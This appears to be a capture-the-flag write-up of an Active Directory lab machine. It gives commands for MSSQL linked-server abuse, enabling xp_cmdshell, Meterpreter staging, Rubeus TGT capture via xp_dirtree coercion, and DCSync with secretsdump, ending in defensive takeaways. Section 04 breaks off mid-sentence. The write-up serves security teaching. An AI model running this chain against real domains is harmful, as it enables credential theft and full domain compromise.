Section 02

Recon & Enumeration

01
Port Scanning & Service Fingerprinting
nmap · ADCS · dual forest · Kerberos auth

A full TCP scan reveals the classic Domain Controller stack plus MSSQL on 1433 and WinRM on 5985. SMB signing is required, making NTLM authentication unreliable — Kerberos must be used throughout. The ADCS service (darkzero-DC01-CA) is noted for future certificate abuse potential. The forest trust between darkzero.htb and darkzero.ext is the critical element — its attributes reveal CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION.

bash
nmap -p- --min-rate 10000 10.129.4.107
nmap -sCV -p 53,88,135,389,445,636,1433,5985,9389 10.129.4.107

DC01.darkzero.htb — Windows Server 2025 Build 26100
MSSQL 2022 RTM on port 1433
SMB signing: required
LDAP signing enforced
ADCS: darkzero-DC01-CA

# Verify Kerberos auth (NTLM times out due to SMB signing enforcement)
impacket-getTGT 'darkzero.htb/john.w:RFulUtONCOL!' -dc-ip 10.129.4.107
export KRB5CCNAME=john.w.ccache
✕
Critical Trust Attribute: The forest trust between darkzero.htb and darkzero.ext has CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION set. This means when a darkzero.htb principal authenticates to darkzero.ext, its full TGT is forwarded — not just a service ticket. This is the root escalation vector.
Section 03

MSSQL Linked Server — DC01 → DC02

02
Linked Server Enumeration & Sysadmin Discovery
pymssql · sp_helplinkedsrvlogin · IS_SRVROLEMEMBER

john.w has MSSQL access on DC01 but is not sysadmin. Enumerating linked servers reveals DC02.darkzero.ext is configured as a linked server. The critical discovery: the login mapping maps john.w to dc01_sql_svc on DC02 — and dc01_sql_svc is sysadmin on DC02. A single EXEC AT query confirms elevated privileges.

python3 — linked server enumeration
import pymssql
conn = pymssql.connect(server='10.129.4.107', user='darkzero\\john.w',
                       password='RFulUtONCOL!', database='master')
cursor = conn.cursor()

# Enumerate linked servers
cursor.execute("SELECT name, data_source FROM sys.servers")
# DC01 (local)
# DC02.darkzero.ext (linked)

# Check login mapping — key finding
cursor.execute("EXEC sp_helplinkedsrvlogin")
# DC02.darkzero.ext | darkzero\john.w | 0 | dc01_sql_svc

# Confirm sysadmin on DC02
cursor.execute("EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]")
# Returns: 1  ← sysadmin confirmed!
✓
Sysadmin on DC02: john.w → dc01_sql_svc mapping gives full sysadmin rights on DC02's MSSQL instance. xp_cmdshell can be enabled to achieve OS command execution.
03
Enable xp_cmdshell on DC02 → Meterpreter Shell
EXEC AT · sp_configure · xp_cmdshell · certutil download

With sysadmin rights on DC02 via the linked server, xp_cmdshell is enabled through the advanced options configuration. A staged Meterpreter payload is served via HTTP and downloaded to DC02 via certutil. A Metasploit handler catches the callback, establishing a shell as darkzero-ext\svc_sql.

sql — enable xp_cmdshell via linked server
-- Enable advanced options on DC02 via AT clause
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]

-- Verify execution context
EXEC ('EXEC xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
darkzero-ext\svc_sql

04
authz_basep Kernel Exploit → SYSTEM + hashdump
CVE-2024-30088 · Windows Server 2022 · DLL injection · winlogon

DC02 runs Windows Server 2022 Build 20348 Revision 2113 — a version confirmed vulnerable to CVE-2024-30088, the authz_basep kernel privilege escalation. Section 05

Cross-Forest TGT Delegation — DC01$ TGT Capture

05
Rubeus TGT Monitor + xp_dirtree Coercion
CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION · Rubeus monitor · xp_dirtree UNC

The forest trust has CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION — when a darkzero.htb principal authenticates to a service in darkzero.ext, its full TGT is forwarded alongside the service ticket. DC01's MSSQL service runs as the machine account (DC01$). Executing xp_dirtree on DC01 with a UNC path pointing to DC02 forces DC01$ to authenticate to DC02 via Kerberos — forwarding DC01$'s TGT. Rubeus running on DC02 as SYSTEM captures it.

metasploit — upload Rubeus + start TGT monitor
# Upload Rubeus to DC02
meterpreter > upload Rubeus.exe C:\\Users\\Public\\ru.exe

# Start TGT monitor — watches for DC01$ tickets
meterpreter > execute -f "C:\\Users\\Public\\ru.exe" \
  -a "monitor /interval:5 /nowrap /filteruser:DC01$" -i

06
ticketConverter → DCSync darkzero.htb → Flags
impacket-ticketConverter · secretsdump · WinRM PtH

The captured base64 TGT is converted from .kirbi to .ccache format and used directly with impacket's secretsdump to DCSync darkzero.htb as DC01$. The Administrator NTLM hash is recovered and used via WinRM to read both flags from DC01.

bash — convert ticket + DCSync
# Save base64 ticket and decode
echo "<base64_ticket>" | base64 -d > dc01.kirbi

# Convert kirbi → ccache (impacket format)
impacket-ticketConverter dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache

# DCSync darkzero.htb using DC01$'s TGT
impacket-secretsdump 'DC01$'@DC01.darkzero.htb \
  -k -no-pass -just-dc-ntlm

key takeaways
01 // TRUST ATTRIBUTES
CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION
This forest trust attribute is often overlooked but is devastatingly powerful. When set, the KDC forwards a principal's full TGT (not just a referral) to services in the trusted forest. Any cross-forest coercion then captures a reusable, forwardable TGT. Audit trust attributes regularly and never set this flag on production forest trusts.
02 // LINKED SERVERS
MSSQL Linked Server Login Mappings
Linked server login mappings are a common and underestimated pivot point. A low-privilege account on one SQL instance can map to sysadmin on another. Always audit sp_helplinkedsrvlogin after gaining any MSSQL access — the mapped remote account's privilege level is what matters, not the local account's.
03 // KERNEL EXPLOITS
CVE-2024-30088 — DLL Injection Warning
Kernel DLL injection exploits must be executed from a stable, expendable process. Migrating Meterpreter into the SQL Server process before running CVE-2024-30088 crashes sqlservr.exe, destroying the entire access chain. Always run privesc DLL injections from the original process or a sacrificial notepad/explorer instance.
04 // xp_dirtree COERCION
Machine Account Auth via xp_dirtree
MSSQL's xp_dirtree with a UNC path forces the SQL Server service account to authenticate to the specified host. When MSSQL runs as the machine account (common for DCs), this coerces machine account Kerberos authentication — which combined with TGT delegation is a direct path to cross-domain compromise.
05 // DUAL FOREST
Compromising Forest A via Forest B
In dual-forest environments, a weak link in Forest B can be a stepping stone to Forest A if trust attributes are misconfigured. The complete path here — B's MSSQL → B's kernel → coerce A's DC via trust delegation → DCSync A — demonstrates how multi-forest complexity compounds security risks.
06 // KERBEROS-ONLY
SMB Signing Enforcement Shapes the Attack
SMB signing requirement and LDAP signing enforcement on DC01 forced all authentication through Kerberos, eliminating NTLM relay attacks. Always use impacket-getTGT + KRB5CCNAME in hardened AD environments rather than NTLM-based tooling — Kerberos is often the only option and the tooling is equally capable.
